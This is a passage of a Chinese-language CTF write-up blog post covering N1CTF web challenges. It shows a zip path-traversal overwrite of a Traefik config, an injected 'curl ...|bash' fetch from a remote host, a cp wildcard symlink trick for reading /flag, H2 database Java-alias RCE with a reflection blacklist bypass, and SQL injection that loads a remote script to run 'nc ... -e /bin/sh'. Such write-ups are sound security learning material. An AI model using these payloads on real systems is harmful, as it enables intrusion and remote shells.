class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>		c.HTML(http.StatusOK, <span class="hljs-string">&quot;index.html&quot;</span>, <span class="hljs-literal">nil</span>)<br>	&#125;)<br><br>	r.POST(<span class="hljs-string">&quot;/public/upload&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>		file, err := c.FormFile(<span class="hljs-string">&quot;file&quot;</span>)<br>		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>			c.JSON(<span class="hljs-number">400</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;File upload failed&quot;</span>&#125;)<br>			<span class="hljs-keyword">return</span><br>		&#125;<br><br>		randomFolder := randFileName()<br>		destDir := filepath.Join(uploadDir, randomFolder)<br><br>		<span class="hljs-keyword">if</span> err := os.MkdirAll(destDir, <span class="hljs-number">0755</span>); err != <span class="hljs-literal">nil</span> &#123;<br>			c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to create directory&quot;</span>&#125;)<br>			<span class="hljs-keyword">return</span><br>		&#125;<br><br>		zipFilePath := filepath.Join(uploadDir, randomFolder+<span class="hljs-string">&quot;.zip&quot;</span>)<br>		<span class="hljs-keyword">if</span> err := c.SaveUploadedFile(file, zipFilePath); err != <span class="hljs-literal">nil</span> &#123;<br>			c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to save uploaded file&quot;</span>&#125;)<br>			<span class="hljs-keyword">return</span><br>		&#125;<br><br>		<span class="hljs-keyword">if</span> err := unzipFile(zipFilePath, destDir); err != <span class="hljs-literal">nil</span> &#123;<br>			fmt.Println(<span class="hljs-string">&quot;Error unzipping file:&quot;</span>, err)<br>			c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to unzip file&quot;</span>&#125;)<br>			<span class="hljs-keyword">return</span><br>		&#125;<br><br>		c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br>			<span class="hljs-string">&quot;message&quot;</span>: fmt.Sprintf(<span class="hljs-string">&quot;File uploaded and extracted successfully to %s&quot;</span>, destDir),<br>		&#125;)<br>	&#125;)<br><br>	r.Run(<span class="hljs-string">&quot;:8080&quot;</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>看源码好像还是挺简单的吧，只要<code>xff</code>访问<code>/flag</code>就行，但是看配置文件</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Dynamic configuration</span><br><br><span class="hljs-attr">http:</span><br>  <span class="hljs-attr">services:</span><br>    <span class="hljs-attr">proxy:</span><br>      <span class="hljs-attr">loadBalancer:</span><br>        <span class="hljs-attr">servers:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">url:</span> <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br>  <span class="hljs-attr">routers:</span><br>    <span class="hljs-attr">index:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/index`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>    <span class="hljs-attr">upload:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/upload`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br></code></pre></td></tr></table></figure>
+
+<p>使用了反向代理只要访问<code>/public/index</code>和<code>/public/upload</code>的流量才会传给服务器这也是为什么打开容器就是404的原因</p>
+<p>我们再来分析源码，看见只让上传压缩包，还会解压，验证方式也是使用的<code>archive/zip模块</code></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209210831989.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250209210831989"></p>
+<p>那我们可以尝试zip解压导致<strong>任意文件覆盖</strong></p>
+<p>我们看下他的目录结构</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">/                                      <span class="hljs-comment"># 根目录</span><br>├── /traefik                           <span class="hljs-comment"># Traefik 二进制文件</span><br>├── /src                                <span class="hljs-comment"># 项目的源代码目录(删到了)</span><br>├── /app                                <span class="hljs-comment"># 应用目录，包含构建后的二进制文件和配置文件</span><br>│   ├── /main                          <span class="hljs-comment"># 生成的 Go 二进制文件</span><br>│   ├── /uploads                       <span class="hljs-comment"># 上传的文件存储目录</span><br>│   ├── /templates                     <span class="hljs-comment"># 应用模板目录</span><br>│   └── /.config                        <span class="hljs-comment"># 配置文件目录</span><br>│       ├── /dynamic.yml               <span class="hljs-comment"># 动态配置文件</span><br>│       └── /traefik.yml               <span class="hljs-comment"># Traefik 配置文件</span><br>├── /run.sh                             <span class="hljs-comment"># 启动脚本</span><br></code></pre></td></tr></table></figure>
+
+<p>还发现每次访问都会加载<code>templates/index.html</code>那么我们就可以覆盖他写一个xss拿到flag对不对</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, &#123; <span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &#125; &#125;)<br><br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">text</span>())<br><br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123; <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">innerHTML</span> = data; &#125;);<br><br>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>如果你也这么想，那你就错了，错在哪</p>
+<ol>
+<li></li>
+</ol>
+<blockquote>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">RUN</span><span class="language-bash"> adduser -D -h /dev/null ctf &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">mkdir</span> /app/uploads &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">chown</span> ctf:ctf -R /app/.config /app/uploads </span><br></code></pre></td></tr></table></figure>
+
+<p>看dockerfile可以发现我们对<code>templates</code>文件夹并没有权限，无法进行写入，（在本地测了好久都可以，但是上传平台不成功)</p>
+</blockquote>
+<ol start="2">
+<li></li>
+</ol>
+<blockquote>
+<p>使用的是反向代理，xss脚本的header就无效了</p>
+</blockquote>
+<p>所有我们得覆盖配置文件，覆盖这个动态配置文件</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209212939429.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250209212939429"></p>
+<p>首先我们准备好配置文件脚本</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">http:</span><br>  <span class="hljs-attr">middlewares:</span><br>    <span class="hljs-attr">forwardedHeaders:</span><br>      <span class="hljs-attr">headers:</span><br>        <span class="hljs-attr">customRequestHeaders:</span><br>          <span class="hljs-attr">X-Forwarded-For:</span> <span class="hljs-string">&quot;&#123;127.0.0.1&#125;&quot;</span><br><br>  <span class="hljs-attr">services:</span><br>    <span class="hljs-attr">proxy:</span><br>      <span class="hljs-attr">loadBalancer:</span><br>        <span class="hljs-attr">servers:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">url:</span> <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br><br>  <span class="hljs-attr">routers:</span><br>    <span class="hljs-attr">index:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/index`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>      <span class="hljs-attr">middlewares:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">forwardedHeaders</span><br><br>    <span class="hljs-attr">upload:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/upload`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>      <span class="hljs-attr">middlewares:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">forwardedHeaders</span><br><br>    <span class="hljs-attr">flag:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/flag`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>      <span class="hljs-attr">middlewares:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">forwardedHeaders</span><br><br></code></pre></td></tr></table></figure>
+
+<p>命名为<code>..1..1.config1dynamic.yml</code>(文件名不能有<code>/</code>暂时用<code>1</code>代替)</p>
+<p>将他压缩，拿到notepad++（winhex也行）打开</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209213519539.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250209213519539"></p>
+<p>把<code>1</code>换成<code>/</code>，有两处都要换上</p>
+<p>上传平台，在访问&#x2F;flag就可以</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250209213900279.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250209213900279"></p>
+<h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>这个题目，呜呜呜，刚进去完全不知道要干嘛，第一次看源码也没翻到最下面，浅浅的翻了一下，第二天再看的时候才再最下面找到</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d7d936edd931ff0b32322c3228fe769a.png" srcset="/tuyi/img/loading.gif" lazyload alt="d7d936edd931ff0b32322c3228fe769a"></p>
+<p>我们直接再上传<code>?_[2025.happy.new.year=curl http;//ip:port/1.sh|bash</code>成功拿到shell</p>
+<p>查看根目录发现有flag，但是权限不够</p>
+<p>尝试suid提权但是没有</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d720cfebd70d29e1289e1429f571c8cd.png" srcset="/tuyi/img/loading.gif" lazyload alt="d720cfebd70d29e1289e1429f571c8cd"></p>
+<p>看一下<code>ps -ef</code>看看执行了什么</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210235408861.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250210235408861"></p>
+<p>发先执行了<code>/start.sh</code>和<code>backup.sh</code></p>
+<p>start没有权限看不了，那就看backup</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/primary<br><span class="hljs-keyword">while</span> :<br><span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">cp</span> -P * /var/www/html/backup/<br>    <span class="hljs-built_in">chmod</span> 755 -R /var/www/html/backup/<br>    <span class="hljs-built_in">sleep</span> 15s<br><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+
+<p>发现他会一直执行，刚开始的思路是环境变量劫持sleep函数让他执行<code>cat /flag &gt; /var/www/html/backup/1</code></p>
+<p>再<code>export PATH=/tmp:$PATH</code>再创建一个<code>/tmp/sleep</code>为<code>cat /flag &gt; /var/www/html/backup/1</code>给权限</p>
+<p>我自己尝试会执行<code>/tem/sleep</code>但由于没有权限就是空文件，但是backp.sh不会执行这个文件，不知道为什么</p>
+<p>后来发现<code>backup.sh</code>使用了通配符<code>*</code>那我们是不是可以再文件名上下手</p>
+<p>刚刚好cp有一个参数<code>-H</code>可以让软链接也被复制</p>
+<p>那么就可以实现</p>
+<p>payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/primary<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-string">&quot;-H&quot;</span>  不是常规文件名不可以用<span class="hljs-built_in">touch</span><br><span class="hljs-built_in">ln</span> -s /flag 1<br></code></pre></td></tr></table></figure>
+
+<p>然后等一会发现<code>/backup</code>文件夹中有1</p>
+<p>再读取1拿到flag</p>
+<h2 id="EasyDB"><a href="#EasyDB" class="headerlink" title="EasyDB"></a>EasyDB</h2><p>真的easy吗，呜呜呜，源码分析得到数据库是<code>h2</code>数据库，有一个账号</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span> admin<br><span class="hljs-symbol">passwd:</span>admin<br></code></pre></td></tr></table></figure>
+
+<p>但是没什么用，而且flag要通过&#x2F;readflag读取，单纯sql是拿不到高shell的，所以我们要另寻他法</p>
+<p>上网查到h2数据库可以执行java代码，那么是不是可以利用这一点来实现任意命令执行能</p>
+<p>网上下载了h2数据库本地部署</p>
+<p>写一个Java函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">DROP ALIAS IF EXISTS exec_cmd; CREATE ALIAS exec_cmd AS <span class="hljs-string">&#x27;String rce() throws java.io.IOException &#123;</span><br><span class="hljs-string">    java.util.Scanner cmd_output = new java.util.Scanner(Runtime.getRuntime().exec(&quot;ls&quot;).getInputStream()).useDelimiter(&quot;\\\\A&quot;);</span><br><span class="hljs-string">    return cmd_output.hasNext() ? cmd_output.next() : &quot;&quot;;</span><br><span class="hljs-string">&#125;&#x27;</span>; CALL <span class="hljs-title function_">exec_cmd</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure>
+
+<p>发现确实可以执行命令</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210224050126.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250210224050126"></p>
+<p>但是存在黑名单</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> &#123;<br>  blackLists.add(<span class="hljs-string">&quot;runtime&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;process&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;exec&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;shell&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;file&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;script&quot;</span>);<br>  blackLists.add(<span class="hljs-string">&quot;groovy&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>通过Java的反射机制改写一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">DROP ALIAS IF EXISTS RCE;<br>CREATE ALIAS RCE AS $$ <br>String <span class="hljs-title function_">rce</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123; <br>  <span class="hljs-type">byte</span>[] classNameBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>&#125;; <br>  <span class="hljs-type">byte</span>[] methodNameBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">103</span>, <span class="hljs-number">101</span>, <span class="hljs-number">116</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>&#125;; <br>  <span class="hljs-type">byte</span>[] methodName2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">101</span>, <span class="hljs-number">120</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>&#125;; <br>  <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;./readflag&quot;</span>; <br>  Class&lt;?&gt; clazz = java.lang.Class.forName(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(classNameBytes)); <br>  java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">method1</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(methodNameBytes)); <br>  java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(methodName2), String.class); <br>  method2.invoke(method1.invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;payload&#125;); <br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Exploited&quot;</span>; <br>&#125; $$;CALL <span class="hljs-title function_">RCE</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure>
+
+<p>本地测试可以执行命令，但是上传之后</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/c7896c977a222bee80520fb8f7e7cb58.png" srcset="/tuyi/img/loading.gif" lazyload alt="c7896c977a222bee80520fb8f7e7cb58"></p>
+<p>只是这样没有回显，后面试了好久是，要不就是500</p>
+<p>又去网上找了下找到<a target="_blank" rel="noopener" href="https://www.cnblogs.com/F12-blog/p/18144377">这篇文章</a></p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210233304791.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250210233304791"></p>
+<p>上传恶意sql文件，再控制jdbc url指向他</p>
+<p>那就不要过滤了，直接写java</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS RCE <span class="hljs-keyword">AS</span> <span class="hljs-string">&#x27;String rce(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd);return &quot;1&quot;;&#125;&#x27;</span>;<span class="hljs-keyword">CALL</span> RCE (<span class="hljs-string">&#x27;nc ip 32771 -e /bin/sh&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>使用<code>python3 -m http.server port</code>开启服务</p>
+<p>sql什么也没过滤直接写</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">admin<span class="hljs-string">&#x27; union select 1,&#x27;</span><span class="hljs-number">2</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">3</span><span class="hljs-string">&#x27; from link_schema(&#x27;</span>TEST2<span class="hljs-string">&#x27;, &#x27;&#x27;, concat(&#x27;</span>jdbc:h2:mem:testdb1;TRACE_LEVEL_SYSTEM_OUT<span class="hljs-operator">=</span><span class="hljs-number">3</span>;<span class="hljs-keyword">IN</span><span class="hljs-string">&#x27;,&#x27;</span>IT<span class="hljs-operator">=</span>RUNSC<span class="hljs-string">&#x27;,&#x27;</span>RIPT <span class="hljs-keyword">FROM</span> <span class="hljs-string">&#x27;&#x27;</span>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">8.138</span><span class="hljs-number">.181</span><span class="hljs-number">.58</span>:<span class="hljs-number">32771</span><span class="hljs-operator">/</span><span class="hljs-number">1.</span><span class="hljs-keyword">sql</span><span class="hljs-string">&#x27;&#x27;&#x27;), &#x27;</span>sa<span class="hljs-string">&#x27;, &#x27;</span>sa<span class="hljs-string">&#x27;, &#x27;</span>PUBLIC<span class="hljs-string">&#x27;);--</span><br></code></pre></td></tr></table></figure>
+
+<p>登录拿到shell</p>
+<p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210234642888.png" srcset="/tuyi/img/loading.gif" lazyload alt="image-20250210234642888"></p>
+<p><code>./readflag</code>拿到flag</p>
+<h1 id="display"><a href="#display" class="headerlink" title="display"></a>display</h1><p>一道xss但是CSP限制只能加载同源脚本，对于前端不是很了解，分析不是很透彻</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> csp = <span class="hljs-string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; base-uri &#x27;none&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/tuyi/categories/%E6%AF%8F%E6%97%A5%E4%B8%80web/" class="category-chain-item">每日一web</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tuyi/tags/%E6%AF%94%E8%B5%9B/" class="print-no-link">#比赛</a>
+      
+        <a href="/tuyi/tags/zip%E4%B8%8A%E4%BC%A0/" class="print-no-link">#zip上传</a>
+      
+        <a href="/tuyi/tags/linux%E8%B6%8A%E6%9D%83/" class="print-no-link">#linux越权</a>
+      
+        <a href="/tuyi/tags/xss/" class="print-no-link">#xss</a>
+      
+        <a href="/tuyi/tags/CVE-2024-2961/" class="print-no-link">#CVE-2024-2961</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>n1ctf</div>
+      <div>https://blog.tuyiisxp.top/2025/02/09/n1ctf/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>tuyi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年2月9日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年2月11日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/tuyi/js/events.js" ></script>
+<script  src="/tuyi/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/tuyi/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
